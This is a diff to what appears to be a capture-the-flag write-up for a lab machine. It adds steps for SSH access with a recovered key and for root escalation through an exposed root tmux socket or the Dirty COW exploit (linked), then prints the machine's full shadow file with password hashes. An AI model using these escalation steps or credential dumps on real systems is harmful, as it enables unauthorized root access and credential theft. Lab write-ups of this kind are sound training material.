@@ -176,3 +176,63 @@ $openssl rsa -in hype_key_e -out hype_key_d
 Enter pass phrase for hype_key_e:
 writing RSA key
 ```
+
+## Initial access and root
+
+- Use the key to get initial access to machine
+
+
+```
+ssh -i id_rsa hype@10.129.55.218
+```
+
+For root, there are two ways
+
+- First, use command `$ /usr/bin/tmux -S /.devs/dev_sess`
+
+![alt text](valentine.png "root")
+
+- Second, use dirtycow exploit
+
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+
+
+- Shadow file
+
+```
+root:$6$ZC6nSRoi$CLMvXwpiQymsSLYvvF69IpKR8eZkGdZCBokSCTwaUM0x/AfdcSGCSHHFEcam6jyYurcrlXxeSmXkjUlBnXTN2.:17568:0:99999:7:::
+daemon:*:15455:0:99999:7:::
+bin:*:15455:0:99999:7:::
+sys:*:15455:0:99999:7:::
+sync:*:15455:0:99999:7:::
+games:*:15455:0:99999:7:::
+man:*:15455:0:99999:7:::
+lp:*:15455:0:99999:7:::
+mail:*:15455:0:99999:7:::
+news:*:15455:0:99999:7:::
+uucp:*:15455:0:99999:7:::
+proxy:*:15455:0:99999:7:::
+www-data:*:15455:0:99999:7:::
+backup:*:15455:0:99999:7:::
+list:*:15455:0:99999:7:::
+irc:*:15455:0:99999:7:::
+gnats:*:15455:0:99999:7:::
+nobody:*:15455:0:99999:7:::
+libuuid:!:15455:0:99999:7:::
+syslog:*:15455:0:99999:7:::
+messagebus:*:15455:0:99999:7:::
+colord:*:15455:0:99999:7:::
+lightdm:*:15455:0:99999:7:::
+whoopsie:*:15455:0:99999:7:::
+avahi-autoipd:*:15455:0:99999:7:::
+avahi:*:15455:0:99999:7:::
+usbmux:*:15455:0:99999:7:::
+kernoops:*:15455:0:99999:7:::
+pulse:*:15455:0:99999:7:::
+rtkit:*:15455:0:99999:7:::
+speech-dispatcher:!:15455:0:99999:7:::
+hplip:*:15455:0:99999:7:::
+saned:*:15455:0:99999:7:::
+hype:$6$vKbykTIV$OCrqMLxv1QcjfhtGMyzzEfhevoTe7sO.v3o1SL3S6wCDc0pXsZvrayn/Wy.TEQuCJWsKLXUh7LakSgTnN/496/:17568:0:99999:7:::
+sshd:*:17511:0:99999:7:::
+```
